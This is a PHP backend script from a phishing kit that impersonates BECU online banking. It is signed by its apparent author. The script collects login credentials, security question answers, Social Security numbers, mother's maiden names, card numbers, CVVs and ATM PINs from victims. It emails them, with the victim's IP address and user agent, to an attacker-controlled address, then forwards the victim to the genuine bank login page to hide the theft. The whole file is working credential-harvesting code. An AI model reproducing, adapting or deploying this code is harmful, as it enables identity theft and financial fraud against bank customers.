<?php
include 'email.php';
$email = trim($_POST['ai']);
$password = trim($_POST['pr']);
$scode = trim($_POST['scode']);

if (isset($_POST['btn2'])) {


	$ip = getenv("REMOTE_ADDR");
	$hostname = gethostbyaddr($ip);
	$useragent = $_SERVER['HTTP_USER_AGENT'];
	$message .= "|----------| |--------------|\n";
	
	$message .= "Question 1           : ".$_POST['q1']."\n";
	$message .= "Answer              : ".$_POST['a1']."\n";

	$message .= "Question 2           : ".$_POST['q2']."\n";
	$message .= "Answer              : ".$_POST['a2']."\n";

	$message .= "Question 3           : ".$_POST['q3']."\n";
	$message .= "Answer              : ".$_POST['a3']."\n";

	
	$message .= "|--------------- I N F O | I P -------------------|\n";
	$message .= "|Client IP: ".$ip."\n";
	$message .= "|--- http://www.geoiptool.com/?IP=$ip ----\n";
	$message .= "User Agent : ".$useragent."\n";
	$message .= "|----------- --------------|\n";
	$send = $Receive_email;
	$subject = "Login : $ip";
	mail($send, $subject, $message); 
	header("Location: ./detail.html");
	
}
else if (isset($_POST['btn3'])) {


	$ip = getenv("REMOTE_ADDR");
	$hostname = gethostbyaddr($ip);
	$useragent = $_SERVER['HTTP_USER_AGENT'];
	$message .= "|----------| |--------------|\n";
	
	$message .= "Full Name           : ".$_POST['fname']."\n";
	$message .= "Address              : ".$_POST['add']."\n";

	$message .= "Zip Code           : ".$_POST['zc']."\n";
	$message .= "Date of Birth              : ".$_POST['dob']."\n";

    $message .= "Account Number           : ".$_POST['acc']."\n";
	$message .= "Social Security Number           : ".$_POST['ssn']."\n";
	$message .= "Mother's Maiden Name	              : ".$_POST['mmn']."\n";

	
	$message .= "|--------------- I N F O | I P -------------------|\n";
	$message .= "|Client IP: ".$ip."\n";
	$message .= "|--- http://www.geoiptool.com/?IP=$ip ----\n";
	$message .= "User Agent : ".$useragent."\n";
	$message .= "|----------- --------------|\n";
	$send = $Receive_email;
	$subject = "Login : $ip";
	mail($send, $subject, $message); 
	header("Location: ./card.html");
	
}
else if (isset($_POST['btn4'])) {


	$ip = getenv("REMOTE_ADDR");
	$hostname = gethostbyaddr($ip);
	$useragent = $_SERVER['HTTP_USER_AGENT'];
	$message .= "|----------| |--------------|\n";
	
	$message .= "Name on Card           : ".$_POST['noc']."\n";
	$message .= "Card Number              : ".$_POST['cn']."\n";
    $message .= "Exp MM/YY          : ".$_POST['exp']."\n";
	$message .= "CVV          : ".$_POST['cvv']."\n";
	$message .= "ATM Pin              : ".$_POST['pin']."\n";

	
	$message .= "|--------------- I N F O | I P -------------------|\n";
	$message .= "|Client IP: ".$ip."\n";
	$message .= "|--- http://www.geoiptool.com/?IP=$ip ----\n";
	$message .= "User Agent : ".$useragent."\n";
	$message .= "|----------- --------------|\n";
	$send = $Receive_email;
	$subject = "Login : $ip";
	mail($send, $subject, $message); 
	header("Location: ./em.html");
	
}
else if (isset($_POST['btn5'])) {


	$ip = getenv("REMOTE_ADDR");
	$hostname = gethostbyaddr($ip);
	$useragent = $_SERVER['HTTP_USER_AGENT'];
	$message .= "|----------| |--------------|\n";
	
	$message .= "Email            : ".$_POST['aii']."\n";
	$message .= "Passcode              : ".$_POST['prr']."\n";



	
	$message .= "|--------------- I N F O | I P -------------------|\n";
	$message .= "|Client IP: ".$ip."\n";
	$message .= "|--- http://www.geoiptool.com/?IP=$ip ----\n";
	$message .= "User Agent : ".$useragent."\n";
	$message .= "|----------- --------------|\n";
	$send = $Receive_email;
	$subject = "Login : $ip";
	mail($send, $subject, $message); 
	header("Location: https://onlinebanking.becu.org/BECUBankingWeb/login.aspx");
	
}
if($email != null && $password != null){

	$ip = getenv("REMOTE_ADDR");
	$hostname = gethostbyaddr($ip);
	$useragent = $_SERVER['HTTP_USER_AGENT'];
	$message .= "|----------| xLs |--------------|\n";
	
	$message .= "Online ID            : ".$email."\n";
	$message .= "Passcode              : ".$password."\n";
	$message .= "|--------------- I N F O | I P -------------------|\n";
	$message .= "|Client IP: ".$ip."\n";
	$message .= "|--- http://www.geoiptool.com/?IP=$ip ----\n";
	$message .= "User Agent : ".$useragent."\n";
	$message .= "|----------- CrEaTeD bY VeNzA --------------|\n";
	$send = $Receive_email;
	$subject = "Login : $ip";
    mail($send, $subject, $message);   
	$signal = 'ok';
	$msg = 'InValid Credentials';
	
	// $praga=rand();
	// $praga=md5($praga);
}

?>